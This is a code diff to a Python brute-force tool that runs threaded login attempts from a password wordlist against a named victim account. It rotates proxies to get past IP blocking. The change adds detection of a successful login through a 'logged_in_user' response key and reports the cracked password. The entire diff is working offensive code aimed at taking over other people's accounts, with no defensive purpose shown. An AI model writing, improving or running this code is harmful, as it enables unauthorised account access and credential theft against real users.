@@ -1,6 +1,6 @@
 from concurrent.futures import (ThreadPoolExecutor, as_completed)
-from time import sleep, strftime, time
-from .exceptions import (BlockedIP, FuckedLogin,WrongPassword)
+from time import (sleep,time)
+from .exceptions import (BlockedIP, FuckedLogin,WrongPassword,GreateLogin)
 from .proxychecker import ProxyChecker
 from .console import (Console,runnerBruteBanner)
 import uuid
@@ -90,7 +90,11 @@ class Bruter:
                                     allow_redirects=True,data=__data,headers=__header,
                                     proxies=__proxies,timeout=timeout)
                 json_load = json.loads(s.text)
-                print(f"{Console.GREEN}{json_load}{Console.DEFAULT}")
+                for key in json_load.keys():
+                    if key == "logged_in_user":
+                        self.__isFind = True
+                        raise GreateLogin()
+
                 if json_load["error_type"] == "ip_block":
                     self.__ip += 1 
                     raise BlockedIP()
@@ -112,24 +116,29 @@ class Bruter:
 
     def __threadPool(self):
         first = time()
-        with ThreadPoolExecutor(max_workers=None) as executor:
-            future_to_password = {executor.submit(self.__login,passw,30): passw for passw in self.__readerwordlist}
-            for future in as_completed(future_to_password):
-                value = future_to_password[future]
-                try:
-                    future.result()
-                except (BlockedIP,WrongPassword,FuckedLogin):
-                    os.system("cls")
-                    print(runnerBruteBanner(target=self.__victim,passw="None" if self.__passw == '' else self.__passw,words=len(list(self.__readerwordlist)),prxies=len(self.__getproxy),ip=self.__ip))
-                    if self.__isFind:
-                        print(f"{Console.DEFAULT}{Console.BOLD}\t?\n\t╰──────≻Password Found: {self.__passw}")
-                        executor.shutdown(wait=False)
-                        break
-                except (requests.exceptions.ConnectionError,requests.exceptions.ReadTimeout):
-                    pass
-        last = time()
-        now_time = int(last-first)
-        print(f"    {Console.BOLD}{Console.RED}[ {Console.PURPLE}!{Console.PURPLE} {Console.RED}] Brute Force Attack is Completed Attack lasted {str(now_time)+' seconds' if now_time < 60 else str((now_time/60).__round__(3))+' minute'}{Console.DEFAULT}")
-        if self.__isFind == False:
-            executor.shutdown(wait=False)
-            print(f"    {Console.BOLD}{Console.RED}[ {Console.PURPLE}!{Console.PURPLE} {Console.RED}] Password not found!{Console.DEFAULT}")
+        while True:
+            with ThreadPoolExecutor(max_workers=None) as executor:
+                future_to_password = {executor.submit(self.__login,passw,30): passw for passw in self.__readerwordlist}
+                for future in as_completed(future_to_password):
+                    value = future_to_password[future]
+                    try:
+                        future.result()
+                    except (BlockedIP,WrongPassword,FuckedLogin,GreateLogin):
+                        os.system("cls")
+                        print(runnerBruteBanner(target=self.__victim,passw=value if self.__passw == '' else self.__passw,words=len(list(self.__readerwordlist)),prxies=len(self.__getproxy),ip=self.__ip))
+                        if self.__isFind:
+                            last = time()
+                            now_time = int(last-first)
+                            print(f"\t?\n\t╰──────≻ Attack lasted {str(now_time)+' seconds' if now_time < 60 else str((now_time/60).__round__(3))+' minute'}")
+                            print(f"{Console.DEFAULT}{Console.BOLD}\t?\n\t╰──────≻Password Found: {self.__passw}")
+                            executor.shutdown(wait=False)
+                            break
+                    except (requests.exceptions.ConnectionError,requests.exceptions.ReadTimeout):
+                        pass
+            last = time()
+            now_time = int(last-first)
+            print(f"    {Console.BOLD}{Console.RED}[ {Console.PURPLE}!{Console.PURPLE} {Console.RED}] Brute Force Attack is Completed\n\t  Attack lasted {str(now_time)+' seconds' if now_time < 60 else str((now_time/60).__round__(3))+' minute'}{Console.DEFAULT}")
+            if self.__isFind == False:
+                executor.shutdown(wait=False)
+                print(f"    {Console.BOLD}{Console.RED}[ {Console.PURPLE}!{Console.PURPLE} {Console.RED}] Password not found!{Console.DEFAULT}")
+                break
